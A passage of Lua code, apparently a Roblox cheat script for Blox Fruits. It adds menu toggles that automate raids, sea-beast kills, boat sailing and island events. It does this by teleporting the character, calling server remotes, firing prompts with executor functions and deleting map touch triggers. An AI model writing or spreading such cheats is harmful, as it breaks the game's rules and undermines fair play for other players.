end)



TrialRightSection:Toggle({
    Name = "Auto Start Raid",
    Flag = "Start Raid",
    Default = false,
    Callback = function(Value)
        _G.Auto_StartRaid = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        if _G.Auto_StartRaid then
            pcall(function()
                if not plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible and GetBP("Special Microchip") then
                    if World2 then
                        _tp(CFrame.new(-6438.73535, 250.645355, -4501.50684))
                        fireclickdetector(workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                    elseif World3 then
                        replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-5097.93164, 316.447021, -3142.66602))
                        fireclickdetector(workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                    end
                end
            end)
        end
    end
end)






TrialRightSection:Toggle({
    Name = "Auto Kaitun Start/Complete Raid",
    Flag = "Complete Raid",
    Default = false,
    Callback = function(Value)
        _G.Raiding = Value
        _G.Auto_StartRaid = Value -- This links both functions to the same toggle
    end
})

-- Auto Start Raid Function
spawn(function()
    while task.wait(1) do -- Using 1 second interval
        if _G.KaitunRaid then
            pcall(function()
                if not plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible and GetBP("Special Microchip") then
                    if World2 then
                        _tp(CFrame.new(-6438.73535, 250.645355, -4501.50684))
                        wait(1) -- Add delay after teleporting before clicking
                        fireclickdetector(workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                    elseif World3 then
                        replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-5097.93164, 316.447021, -3142.66602))
                        wait(1) -- Add delay after teleporting before clicking
                        fireclickdetector(workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                    end
                end
            end)
        end
    end
end)

-- Auto Complete Raid Function
spawn(function()
    while wait(2) do
        if _G.Raiding then
            pcall(function()
                if plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
                    if workspace._WorldOrigin.Locations:FindFirstChild('Island 1') then
                        local b7 = workspace.Enemies:GetChildren()
                        if # b7 > 0 then
                            for b8, b9 in pairs(workspace.Enemies:GetChildren()) do
                                if (b9.HumanoidRootPart.Position - Root.Position).magnitude <= 2000 and b9.Humanoid.Health > 0 then
                                    repeat
                                        wait()
                                        m.Kill(b9, _G.Raiding)
                                    until not _G.Raiding or not b9.Parent or b9.Humanoid.Health <= 0 or not (workspace._WorldOrigin.Locations:FindFirstChild('Island 1')) or plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == false
                                end
                            end
                        else
                            if workspace._WorldOrigin.Locations:FindFirstChild('Island 1') then
                                if workspace._WorldOrigin.Locations:FindFirstChild('Island 5') then
                                    _tp(workspace._WorldOrigin.Locations['Island 5'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 4') then
                                    _tp(workspace._WorldOrigin.Locations['Island 4'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 3') then
                                    _tp(workspace._WorldOrigin.Locations['Island 3'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 2') then
                                    _tp(workspace._WorldOrigin.Locations['Island 2'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 1') then
                                    _tp(workspace._WorldOrigin.Locations['Island 1'].CFrame * CFrame.new(4, 65, 10))
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)




TrialRightSection:Toggle({
    Name = "Auto Complete Raids",
    Flag = "ComeplteNotKaitun",
    Default = false,
    Callback = function(Value)
        _G.Raiding = Value
    end
})

spawn(function()
    while wait() do
        if _G.Raiding then
            pcall(function()
                if plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
                    if workspace._WorldOrigin.Locations:FindFirstChild('Island 1') then
                        local b7 = workspace.Enemies:GetChildren()
                        if # b7 > 0 then
                            for b8, b9 in pairs(workspace.Enemies:GetChildren()) do
                                if (b9.HumanoidRootPart.Position - Root.Position).magnitude <= 2000 and b9.Humanoid.Health > 0 then
                                    repeat
                                        wait()
                                        m.Kill(b9, _G.Raiding)
                                    until not _G.Raiding or not b9.Parent or b9.Humanoid.Health <= 0 or not (workspace._WorldOrigin.Locations:FindFirstChild('Island 1')) or plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == false
                                end
                            end
                        else
                            if workspace._WorldOrigin.Locations:FindFirstChild('Island 1') then
                                if workspace._WorldOrigin.Locations:FindFirstChild('Island 5') then
                                    _tp(workspace._WorldOrigin.Locations['Island 5'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 4') then
                                    _tp(workspace._WorldOrigin.Locations['Island 4'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 3') then
                                    _tp(workspace._WorldOrigin.Locations['Island 3'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 2') then
                                    _tp(workspace._WorldOrigin.Locations['Island 2'].CFrame * CFrame.new(4, 65, 10))
                                elseif workspace._WorldOrigin.Locations:FindFirstChild('Island 1') then
                                    _tp(workspace._WorldOrigin.Locations['Island 1'].CFrame * CFrame.new(4, 65, 10))
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)




TrialRightSection:Toggle({
    Name = "Auto Teleport Lab",
    Flag = "TpLab",
    Default = false,
    Callback = function(Value)
        _G.TpLab = Value
    end
})

spawn(function()
    while task.wait(Sec) do
        if _G.TpLab then
            pcall(function()
                if Sea2 then
                    _tp(CFrame.new(-6438.73535, 250.645355, -4501.50684))
                elseif Sea3 then
                    _tp(CFrame.new(-5017.40869, 314.844055, -2823.0127, -0.925743818, 4.48217499e-8, -0.378151238, 4.55503146e-9, 1, 1.07377559e-7, 0.378151238, 9.7681621e-8, -0.925743818))
                end
            end)
        end
    end
end)

TrialRightSection:Toggle({
    Name = "Auto Next Island",
    Flag = "NextIsland",
    Default = false,
    Callback = function(value)
        _G.NextIs = value
    end
})

spawn(function()
    while wait(Sec) do
        if _G.NextIs then
            if plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
                local locations = workspace._WorldOrigin.Locations
                for i = 5, 1, -1 do
                    local island = locations:FindFirstChild("Island " .. i)
                    if island then
                        _tp(island.CFrame * CFrame.new(0, 50, 100))
                        break
                    end
                end
            end
        end
    end
end)




TrialRightSection:Toggle({
    Name = "Auto Awakening",
    Flag = "Awakening",
    Default = false,
    Callback = function(value)
        _G.Auto_Awakener = value
    end
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Awakener then
                replicated.Remotes.CommF_:InvokeServer("Awakener", "Check")
                replicated.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
            end
        end)
    end
end)


local Sea = Library:Tab({ 

    Name = "Sea Events" 

})

local SeaLeftSection = Sea:Section({ 

    Name = "Sea", 

    Side = "Left" 
})


bP = {
    'Guardian',
    'PirateGrandBrigade',
    'MarineGrandBrigade',
    'PirateBrigade',
    'MarineBrigade',
    'PirateSloop',
    'MarineSloop',
    'Beast Hunter'
}
bQ = {
    'Lv 1',
    'Lv 2',
    'Lv 3',
    'Lv 4',
    'Lv 5',
    'Lv 6',
    'Lv Infinite'
}

SeaLeftSection:Dropdown({
    Name = "Select Boat",
    Options = bP,
    Flag = "SelectBoat",
    Callback = function(Value)
        _G.SelectedBoat = Value
    end
})

SeaLeftSection:Toggle({
    Name = "Auto Buy Boat",
    Default = false,
    Flag = "BuyBoat",
    Callback = function(Value)
        _G.AutoBuyBoat = Value
        if Value then
            pcall(function()
                replicated.Remotes.CommF_:InvokeServer('BuyBoat', _G.SelectedBoat)
            end)
        end
    end
})

SeaLeftSection:Dropdown({
    Name = "Select Sea Level",
    Options = bQ,
    Flag = "SeaLvl",
    Callback = function(Value)
        _G.DangerSc = Value
    end
})

SeaLeftSection:Toggle({
    Name = "Auto Sail Boat",
    Default = false,
    Flag = "SailBoat",
    Callback = function(Value)
        _G.SailBoats = Value
    end
})

spawn(function()
    while task.wait() do
        if _G.SailBoats then
            pcall(function()
                local boat = CheckBoat()
                if not boat and not (CheckShark() and _G.Shark or CheckTerrorShark() and _G.TerrorShark or CheckFishCrew() and _G.MobCrew or CheckPiranha() and _G.Piranha) and not (CheckEnemiesBoat() and _G.FishBoat) and not (CheckSeaBeast() and _G.SeaBeast1) and not (_G.PGB and CheckPirateGrandBrigade()) and not (_G.Leviathan1 and CheckLeviathan()) then
                    local destination = CFrame.new(-16927.451, 9.086, 433.864)
                    TeleportToTarget(destination)
                    if (destination.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                        replicated.Remotes.CommF_:InvokeServer('BuyBoat', _G.SelectedBoat)
                    end
                elseif boat and not (CheckShark() and _G.Shark or CheckTerrorShark() and _G.TerrorShark or CheckFishCrew() and _G.MobCrew or CheckPiranha() and _G.Piranha) and not (CheckEnemiesBoat() and _G.FishBoat) and not (CheckSeaBeast() and _G.SeaBeast1) and not (_G.PGB and CheckPirateGrandBrigade()) and not (_G.Leviathan1 and CheckLeviathan()) then
                    if not plr.Character.Humanoid.Sit then
                        _tp(boat.VehicleSeat.CFrame * CFrame.new(0, 1, 0))
                    else
                        repeat
                            task.wait()
                            if _G.DangerSc == 'Lv 1' then
                                CFrameSelectedZone = CFrame.new(-21998.375, BoatY, -682.309143)
                            elseif _G.DangerSc == 'Lv 2' then
                                CFrameSelectedZone = CFrame.new(-26779.5215, BoatY, -822.858032)
                            elseif _G.DangerSc == 'Lv 3' then
                                CFrameSelectedZone = CFrame.new(-31171.957, BoatY, -2256.93774)
                            elseif _G.DangerSc == 'Lv 4' then
                                CFrameSelectedZone = CFrame.new(-34054.6875, BoatY, -2560.12012)
                            elseif _G.DangerSc == 'Lv 5' then
                                CFrameSelectedZone = CFrame.new(-38887.5547, BoatY, -2162.99023)
                            elseif _G.DangerSc == 'Lv 6' then
                                CFrameSelectedZone = CFrame.new(-44541.7617, BoatY, -1244.8584)
                            elseif _G.DangerSc == 'Lv Infinite' then
                                CFrameSelectedZone = CFrame.new(-1E7, BoatY, 37016.25)
                            end
                            if (not _G.FishBoat and CheckEnemiesBoat()) or (not _G.PGB and CheckPirateGrandBrigade()) or (not _G.TerrorShark and CheckTerrorShark()) then
                                _tp(CFrameSelectedZone * CFrame.new(0, 150, 0))
                            else
                                _tp(CFrameSelectedZone)
                            end
                        until not _G.SailBoats or (CheckShark() and _G.Shark or CheckTerrorShark() and _G.TerrorShark or CheckFishCrew() and _G.MobCrew or CheckPiranha() and _G.Piranha) or CheckSeaBeast() and _G.SeaBeast1 or CheckEnemiesBoat() and _G.FishBoat or _G.Leviathan1 and CheckLeviathan() or _G.PGB and CheckPirateGrandBrigade() or not plr.Character:WaitForChild("Humanoid").Sit
                        plr.Character.Humanoid.Sit = false
                    end
                elseif boat and CheckFishCrew() and _G.MobCrew then
                    for _, mob in pairs(workspace.Enemies:GetChildren()) do
                        if (mob.Name == 'Fish Crew Member' or mob.Name == 'Haunted Crew Member') and mob:FindFirstChild('HumanoidRootPart') and mob.Humanoid.Health > 0 then
                            repeat
                                task.wait()
                                _tp(mob.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
                                EquipWeapon(_G.SelectWeapon)
                                BringEnemy()
                            until not _G.MobCrew or not mob.Parent or mob.Humanoid.Health <= 0
                        end
                    end
                end
            end)
        end
    end
end)


local SeaDownLeftSection = Sea:Section({ 

    Name = "Sea", 

    Side = "Left" 
})





SeaDownLeftSection:Toggle({
    Name = "Auto Kill Shark",
    Flag = "KillShark",
    Default = false,
    Callback = function(Value)
        _G.Shark = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Piranha",
    Flag = "KillPiranha",
    Default = false,
    Callback = function(Value)
        _G.Piranha = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Terror Shark",
    Flag = "Kill TerrorShark",
    Default = false,
    Callback = function(Value)
        _G.TerrorShark = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Crew Member",
    Flag = "CrewMember",
    Default = false,
    Callback = function(Value)
        _G.MobCrew = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Pirate Grand Brigade",
    Flag = "PirateGrandBrigade",
    Default = false,
    Callback = function(Value)
        _G.PGB = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Fish Boat",
    Flag = "Fish Boat",
    Default = false,
    Callback = function(Value)
        _G.FishBoat = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Sea Beast",
    Flag = "SeaBeast",
    Default = false,
    Callback = function(Value)
        _G.SeaBeast1 = Value
    end
})

SeaDownLeftSection:Toggle({
    Name = "Auto Kill Leviathan",
    Flag = "KillLeviathan",
    Default = false,
    Callback = function(Value)
        _G.Leviathan1 = Value
    end
})

spawn(function()
    while wait() do
        pcall(function()
            if _G.Shark then
                local bY = {
                    'Shark'
                }
                if CheckShark() then
                    for bZ, b_ in pairs(workspace.Enemies:GetChildren()) do
                        if table.find(bY, b_.Name) then
                            if m.Alive(b_) then
                                repeat
                                    task.wait()
                                    m.Kill(b_, _G.Shark)
                                until _G.Shark == false or not b_.Parent or b_.Humanoid.Health <= 0
                            end
                        end
                    end
                end
            end
            if _G.TerrorShark then
                local bY = {
                    'Terrorshark'
                }
                if CheckTerrorShark() then
                    for bZ, b_ in pairs(workspace.Enemies:GetChildren()) do
                        if table.find(bY, b_.Name) then
                            if m.Alive(b_) then
                                repeat
                                    task.wait()
                                    m.KillSea(b_, _G.TerrorShark)
                                until _G.TerrorShark == false or not b_.Parent or b_.Humanoid.Health <= 0
                            end
                        end
                    end
                end
            end
            if _G.Piranha then
                local bY = {
                    'Piranha'
                }
                if CheckPiranha() then
                    for bZ, b_ in pairs(workspace.Enemies:GetChildren()) do
                        if table.find(bY, b_.Name) then
                            if m.Alive(b_) then
                                repeat
                                    task.wait()
                                    m.Kill(b_, _G.Piranha)
                                until _G.Piranha == false or not b_.Parent or b_.Humanoid.Health <= 0
                            end
                        end
                    end
                end
            end
            if _G.SeaBeast1 then
                if workspace.SeaBeasts:FindFirstChild('SeaBeast1') then
                    for bY, bZ in pairs(workspace.SeaBeasts:GetChildren()) do
                        if bZ:FindFirstChild('HumanoidRootPart') and bZ:FindFirstChild('Health') and bZ.Health.Value > 0 then
                            repeat
                                task.wait()
                                spawn(function()
                                    _tp(CFrame.new(bZ.HumanoidRootPart.Position.X, game:GetService('Workspace').Map['WaterBase-Plane'].Position.Y + 200, bZ.HumanoidRootPart.Position.Z))
                                end)
                                if plr:DistanceFromCharacter(bZ.HumanoidRootPart.CFrame.Position) <= 500 then
                                    AitSeaSkill_Custom = bZ.HumanoidRootPart.CFrame
                                    MousePos = AitSeaSkill_Custom.Position

                                    -- Always use all weapons regardless of CheckF()
                                    -- First Melee skills
                                    weaponSc('Melee')
                                    task.wait(0.1)
                                    Useskills('Melee', 'Z')
                                    task.wait(0.05)
                                    Useskills('Melee', 'X')
                                    task.wait(0.05)
                                    Useskills('Melee', 'C')
                                    task.wait(0.3)
                                    
                                    -- Then Sword skills
                                    weaponSc('Sword')
                                    task.wait(0.1)
                                    Useskills('Sword', 'Z')
                                    task.wait(0.05)
                                    Useskills('Sword', 'X')
                                    task.wait(0.3)
                                    
                                    -- Then Blox Fruit skills
                                    weaponSc('Blox Fruit')
                                    task.wait(0.1)
                                    Useskills('Blox Fruit', 'Z')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'X')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'C')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'V')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'F')
                                    task.wait(0.3)
                                    
                                    -- Finally Gun skills
                                    weaponSc('Gun')
                                    task.wait(0.1)
                                    Useskills('Gun', 'Z')
                                    task.wait(0.05)
                                    Useskills('Gun', 'X')
                                end
                            until _G.SeaBeast1 == false or not bZ:FindFirstChild('HumanoidRootPart') or not bZ.Parent or bZ.Health.Value <= 0
                        end
                    end
                end
            end
            if _G.Leviathan1 then
                if workspace.SeaBeasts:FindFirstChild('Leviathan') then
                    for bY, bZ in pairs(workspace.SeaBeasts:GetChildren()) do
                        if bZ:FindFirstChild('HumanoidRootPart') and bZ:FindFirstChild('Leviathan Segment') and bZ:FindFirstChild('Health') and bZ.Health.Value > 0 then
                            repeat
                                task.wait()
                                spawn(function()
                                    _tp(CFrame.new(bZ.HumanoidRootPart.Position.X, game:GetService('Workspace').Map['WaterBase-Plane'].Position.Y + 200, bZ.HumanoidRootPart.Position.Z))
                                end)
                                if plr:DistanceFromCharacter(bZ.HumanoidRootPart.CFrame.Position) <= 500 then
                                    MousePos = bZ:FindFirstChild('Leviathan Segment').Position
                                    
                                    -- Always use all weapons regardless of CheckF()
                                    -- First Melee skills
                                    weaponSc('Melee')
                                    task.wait(0.1)
                                    Useskills('Melee', 'Z')
                                    task.wait(0.05)
                                    Useskills('Melee', 'X')
                                    task.wait(0.05)
                                    Useskills('Melee', 'C')
                                    task.wait(0.3)
                                    
                                    -- Then Sword skills
                                    weaponSc('Sword')
                                    task.wait(0.1)
                                    Useskills('Sword', 'Z')
                                    task.wait(0.05)
                                    Useskills('Sword', 'X')
                                    task.wait(0.3)
                                    
                                    -- Then Blox Fruit skills
                                    weaponSc('Blox Fruit')
                                    task.wait(0.1)
                                    Useskills('Blox Fruit', 'Z')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'X')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'C')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'V')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'F')
                                    task.wait(0.3)
                                    
                                    -- Finally Gun skills
                                    weaponSc('Gun')
                                    task.wait(0.1)
                                    Useskills('Gun', 'Z')
                                    task.wait(0.05)
                                    Useskills('Gun', 'X')
                                end
                            until _G.Leviathan1 == false or not bZ:FindFirstChild('HumanoidRootPart') or not bZ.Parent or bZ.Health.Value <= 0
                        end
                    end
                end
            end
            if _G.FishBoat then
                if CheckEnemiesBoat() then
                    for bY, bZ in pairs(workspace.Enemies:GetChildren()) do
                        if bZ:FindFirstChild('Health') and bZ.Health.Value > 0 and bZ:FindFirstChild('VehicleSeat') then
                            repeat
                                task.wait()
                                spawn(function()
                                    if bZ.Name == 'FishBoat' then
                                        _tp(bZ.Engine.CFrame * CFrame.new(0, - 50, - 25))
                                    end
                                end)
                                if plr:DistanceFromCharacter(bZ.Engine.CFrame.Position) <= 150 then
                                    AitSeaSkill_Custom = bZ.Engine.CFrame
                                    MousePos = AitSeaSkill_Custom.Position
                                    
                                    -- Always use all weapons regardless of CheckF()
                                    -- First Melee skills
                                    weaponSc('Melee')
                                    task.wait(0.1)
                                    Useskills('Melee', 'Z')
                                    task.wait(0.05)
                                    Useskills('Melee', 'X')
                                    task.wait(0.05)
                                    Useskills('Melee', 'C')
                                    task.wait(0.3)
                                    
                                    -- Then Sword skills
                                    weaponSc('Sword')
                                    task.wait(0.1)
                                    Useskills('Sword', 'Z')
                                    task.wait(0.05)
                                    Useskills('Sword', 'X')
                                    task.wait(0.3)
                                    
                                    -- Then Blox Fruit skills
                                    weaponSc('Blox Fruit')
                                    task.wait(0.1)
                                    Useskills('Blox Fruit', 'Z')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'X')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'C')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'V')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'F')
                                    task.wait(0.3)
                                    
                                    -- Finally Gun skills
                                    weaponSc('Gun')
                                    task.wait(0.1)
                                    Useskills('Gun', 'Z')
                                    task.wait(0.05)
                                    Useskills('Gun', 'X')
                                end
                            until _G.FishBoat == false or not bZ:FindFirstChild('VehicleSeat') or bZ.Health.Value <= 0
                        end
                    end
                end
            end
            if _G.PGB then
                if CheckPirateGrandBrigade() then
                    for bY, bZ in pairs(workspace.Enemies:GetChildren()) do
                        if bZ:FindFirstChild('Health') and bZ.Health.Value > 0 and bZ:FindFirstChild('VehicleSeat') then
                            repeat
                                task.wait()
                                spawn(function()
                                    if bZ.Name == 'PirateBrigade' then
                                        _tp(bZ.Engine.CFrame * CFrame.new(0, - 30, - 10))
                                    elseif bZ.Name == 'PirateGrandBrigade' then
                                        _tp(bZ.Engine.CFrame * CFrame.new(0, - 50, - 50))
                                    end
                                end)
                                if plr:DistanceFromCharacter(bZ.Engine.CFrame.Position) <= 150 then
                                    AitSeaSkill_Custom = bZ.Engine.CFrame
                                    MousePos = AitSeaSkill_Custom.Position
                                    
                                    -- Always use all weapons regardless of CheckF()
                                    -- First Melee skills
                                    weaponSc('Melee')
                                    task.wait(0.1)
                                    Useskills('Melee', 'Z')
                                    task.wait(0.05)
                                    Useskills('Melee', 'X')
                                    task.wait(0.05)
                                    Useskills('Melee', 'C')
                                    task.wait(0.3)
                                    
                                    -- Then Sword skills
                                    weaponSc('Sword')
                                    task.wait(0.1)
                                    Useskills('Sword', 'Z')
                                    task.wait(0.05)
                                    Useskills('Sword', 'X')
                                    task.wait(0.3)
                                    
                                    -- Then Blox Fruit skills
                                    weaponSc('Blox Fruit')
                                    task.wait(0.1)
                                    Useskills('Blox Fruit', 'Z')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'X')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'C')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'V')
                                    task.wait(0.05)
                                    Useskills('Blox Fruit', 'F')
                                    task.wait(0.3)
                                    
                                    -- Finally Gun skills
                                    weaponSc('Gun')
                                    task.wait(0.1)
                                    Useskills('Gun', 'Z')
                                    task.wait(0.05)
                                    Useskills('Gun', 'X')
                                end
                            until _G.PGB == false or not bZ:FindFirstChild('VehicleSeat') or bZ.Health.Value <= 0
                        end
                    end
                end
            end
        end)
    end
end)




local SeaRightSection = Sea:Section({ 

    Name = "Vulcan", 

    Side = "Right" 
})




SeaRightSection:Dropdown({
    Name = "Choose Weapon",
    Flag = "ChooseVulcanWep",
    Options = { "Melee", "Sword", "Gun", "Blox Fruit" },
    Default = false,
    Callback = function(Value)
        _G.ChooseWPVolcano = Value
    end
})

spawn(function()

while wait(Sec) do

    pcall(function()

        if _G.ChooseWPVolcano == 'Melee' then

            for bL, bM in pairs(plr.Backpack:GetChildren()) do

                if bM.ToolTip == 'Melee' then

                    if plr.Backpack:FindFirstChild(tostring(bM.Name)) then

                        _G.SelectWeaponV = bM.Name

                    end

                end

            end

        elseif _G.ChooseWPVolcano == 'Sword' then

            for bL, bM in pairs(plr.Backpack:GetChildren()) do

                if bM.ToolTip == 'Sword' then

                    if plr.Backpack:FindFirstChild(tostring(bM.Name)) then

                        _G.SelectWeaponV = bM.Name

                    end

                end

            end

        elseif _G.ChooseWPVolcano == 'Gun' then

            for bL, bM in pairs(plr.Backpack:GetChildren()) do

                if bM.ToolTip == 'Gun' then

                    if plr.Backpack:FindFirstChild(tostring(bM.Name)) then

                        _G.SelectWeaponV = bM.Name

                    end

                end

            end

        elseif _G.ChooseWPVolcano == 'Blox Fruit' then

            for bL, bM in pairs(plr.Backpack:GetChildren()) do

                if bM.ToolTip == 'Blox Fruit' then

                    if plr.Backpack:FindFirstChild(tostring(bM.Name)) then

                        _G.SelectWeaponV = bM.Name

                    end

                end

            end

        end

    end)

end

end)


SeaRightSection:Toggle({
    Name = "Auto Find Prehistoric Island & Auto Start",
    Flag = "FindVulcan",
    Default = false,
    Callback = function(Value)
        _G.Prehis_Find = Value
    end
})

spawn(function()
    while wait() do
        if _G.Prehis_Find then
            pcall(function()
                if not workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island", true) then
                    local Boat = CheckBoat()
                    if not Boat then
                        local target = CFrame.new(-16927.451, 9.086, 433.864)
                        TeleportToTarget(target)
                        if (target.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                        end
                    else
                        if plr.Character.Humanoid.Sit == false then
                            local pos = Boat.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                            _tp(pos)
                        else
                            repeat
                                wait()
                                local pos = CFrame.new(-1E7, 31, 37016.25)
                                if CheckEnemiesBoat() or CheckTerrorShark() or CheckPirateGrandBrigade() then
                                    _tp(CFrame.new(-1E7, 150, 37016.25))
                                else
                                    _tp(CFrame.new(-1E7, BoatY, 37016.25))
                                end
                            until not _G.Prehis_Find
                                or (pos.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10
                                or workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island")
                                or plr.Character.Humanoid.Sit == false

                            plr.Character.Humanoid.Sit = false
                        end
                    end
                else
                    local loc = workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island")
                    if (loc.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude >= 2000 then
                        _tp(loc.CFrame)
                    end
                    if workspace.Map:FindFirstChild("PrehistoricIsland", true) or loc then
                        if workspace.Map.PrehistoricIsland.Core.ActivationPrompt:FindFirstChild("ProximityPrompt", true) then
                            local prompt = workspace.Map.PrehistoricIsland.Core.ActivationPrompt.ProximityPrompt
                            if plr:DistanceFromCharacter(prompt.Parent.CFrame.Position) <= 150 then
                                fireproximityprompt(prompt, math.huge)
                                vim1:SendKeyEvent(true, "E", false, game)
                                wait(1.5)
                                vim1:SendKeyEvent(false, "E", false, game)
                            end
                            _tp(prompt.Parent.CFrame)
                        end
                    end
                end
            end)
        end
    end
end)


SeaRightSection:Toggle({
    Name = "Auto Patch Volcano & Auto Kill Golem",
    Flag = "AutoPatch",
    Default = false,
    Callback = function(v)
        _G.Prehis_Skills = v
    end
})

spawn(function()
    while wait() do
        pcall(function()
            if _G.Prehis_Skills then
                if workspace.Map:FindFirstChild('PrehistoricIsland') then
                    local bN = workspace.Map.PrehistoricIsland:FindFirstChild('TrialTeleport')
                    for bO, bP in pairs(workspace.Map.PrehistoricIsland:GetDescendants()) do
                        if bP.Name == 'TouchInterest' then
                            if not (bN and bP:IsDescendantOf(bN)) then
                                bP.Parent:Destroy()
                            end
                        end
                    end
                    if workspace.Enemies:FindFirstChild('Lava Golem') then
                        local bO = GetConnectionEnemies('Lava Golem')
                        if bO then
                            repeat
                                wait()
                                m.Kill(bO, _G.Prehis_Skills)
                            until not _G.Prehis_Skills or not bO.Parent or bO.Humanoid.Health <= 0
                        end
                    end
                    for bO, bP in pairs(game.Workspace.Map.PrehistoricIsland.Core.VolcanoRocks:GetChildren()) do
                        if bP:FindFirstChild('VFXLayer') then
                            if bP:FindFirstChild('VFXLayer').At0.Glow.Enabled == true or bP.VFXLayer.At0.Glow.Enabled == true then
                                repeat
                                    wait()
                                    _tp(bP.VFXLayer.CFrame)
                                    if bP.VFXLayer.At0.Glow.Enabled == true and plr:DistanceFromCharacter(bP.VFXLayer.CFrame.Position) <= 150 then
                                        MousePos = bP.VFXLayer.CFrame.Position
                                        EquipWeapon(_G.SelectWeaponV)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(true, 'Z', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(false, 'Z', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(true, 'X', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(false, 'X', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(true, 'C', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(false, 'C', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(true, 'V', false, game)
                                        game:GetService('VirtualInputManager'):SendKeyEvent(false, 'V', false, game)
                                    end
                                until not _G.Prehis_Skills or bP:FindFirstChild('VFXLayer').At0.Glow.Enabled == false or bP.VFXLayer.At0.Glow.Enabled == false or workspace.Enemies:FindFirstChild('Lava Golem')
                            end
                        end
                    end
                end
            end
        end)
    end
end)

SeaRightSection:Toggle({
    Name = "Auto Collect Bones",
    Flag = "DinoBone",
    Default = false,
    Callback = function(Value)
        _G.Prehis_DB = Value
    end
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Prehis_DB then
                for _, bone in pairs(workspace:GetChildren()) do
                    if bone.Name == "DinoBone" then
                        _tp(bone.CFrame)
                    end
                end
            end
        end)
    end
end)

SeaRightSection:Toggle({
    Name = "Auto Collect Egg",
    Flag = "DinoEgg",
    Default = false,
    Callback = function(Value)
        _G.Prehis_DE = Value
    end
})

spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Prehis_DE then
                local egg = workspace.Map.PrehistoricIsland.Core.SpawnedDragonEggs:FindFirstChild("DragonEgg")
                if egg then
                    _tp(egg.Molten.CFrame)
                    fireproximityprompt(egg.Molten.ProximityPrompt, 30)
                end
            end
        end)
    end
end)



local SeaDownRightSection = Sea:Section({ 

    Name = "Mirage", 

    Side = "Right" 
})



SeaDownRightSection:Toggle({
    Name = "Auto Find Mirage Island & Tween Mirage Island", 
    Flag = "AutoFindMystic",
    Default = false,
    Callback = function(state)
        _G.FindMirage = state
    end
})

spawn(function()
    while wait() do
        if _G.FindMirage then
            pcall(function()
                if not workspace._WorldOrigin.Locations:FindFirstChild('Mirage Island', true) then
                    local bo = CheckBoat()
                    if not bo then
                        local bp = CFrame.new(- 16927.451, 9.086, 433.864)
                        TeleportToTarget(bp)
                        if (bp.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
